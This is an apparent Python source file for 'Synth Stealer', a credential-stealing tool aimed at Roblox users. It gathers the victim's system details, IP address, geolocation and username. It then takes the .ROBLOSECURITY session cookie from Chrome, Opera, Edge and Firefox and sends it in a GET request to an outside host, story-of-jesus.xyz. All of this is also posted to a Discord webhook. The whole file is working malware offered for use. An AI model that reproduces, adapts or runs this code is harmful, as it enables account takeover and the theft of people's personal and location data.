import os
import time
try:
   import platform 
   import requests
   import browser_cookie3
   import json
   import socket
   import os
   import psutil
except:
   os.system('pip install platform')
   os.system('pip install requests')
   os.system('pip install browser_cookie3')
   os.system('pip install json')
   os.system('pip install socket')
   os.system('pip install psutil')
   print("run again")
   time.sleep(5)
webhook = ''


per_cpu = psutil.cpu_percent(percpu=True)
for idx, usage in enumerate(per_cpu):
  mem_usage = psutil.virtual_memory()
  mc = platform.machine()
  verse = platform.version()
  sys = platform.system() 
  proc = platform.processor()
  ms = platform.uname()
  hs = socket.gethostname()  
  ips = requests.get('https://api.ipify.org').text
  info = requests.get("http://ipinfo.io/json").json()
  ct = info['city']
  he = info['hostname']
  cy = info['country']
  rn = info['region']
  lg = info['loc']
  pt = info['postal']
  tz = info['timezone']
  org = info['org']
  pcuser = os.getenv("UserName")
  pass
try:
   cookies = browser_cookie3.chrome(domain_name='roblox.com')
   cookies = str(cookies)
   cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
   r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
except:
   pass

try:
   cookies = browser_cookie3.opera(domain_name='roblox.com')
   cookies = str(cookies)
   cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
   r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
except:
   pass

try:
   cookies = browser_cookie3.edge(domain_name='roblox.com')
   cookies = str(cookies)
   cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
   r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
except:
   pass

try:
   cookies = browser_cookie3.firefox(domain_name='roblox.com')
   cookies = str(cookies)
   cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
   r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
except:
   pass


lmaooo = {
           "embeds": [
                {
                    "author": {
                        "name": f"Synth Stealer | {pcuser} ran Synth",
                    },
                    "description": f"***PC INFO***\n*Machine > {mc}\nPC Version > {verse}\nSystem > {sys}\nProcessor > {proc}\nCPU Usage: > {usage}%*\n\n***RAM INFO***\nFree: > {mem_usage.percent}%\nTotal: > {mem_usage.total/(1024**3):.2f}G\nUsed: > {mem_usage.used/(1024**3):.2f}G*\n\n***IP INFO***\n*Ip > {ips}\ncity > {ct}\nRegion > {rn}\ncountry > {cy}\nhostname > {he}\nlang > {lg}\nPostal > {pt}\nTimezone > {tz}\nOrg > {org}*\n\n***ROBLOX INFO***\n*ROBLOX COOKIE* >```fix\n{cookie}```\n\n***DISCORD MODULES***\n*Injection: :white_check_mark: Coming soon..*",
                    "color": 0x00C7FF,
                    
                    "footer": {
                      "text": "Synth Stealer | synthetic#9270 | https://github.com/syntheticc/Synth"
                    }
                }
            ]
        }
requests.post(f"{webhook}", json=lmaooo)

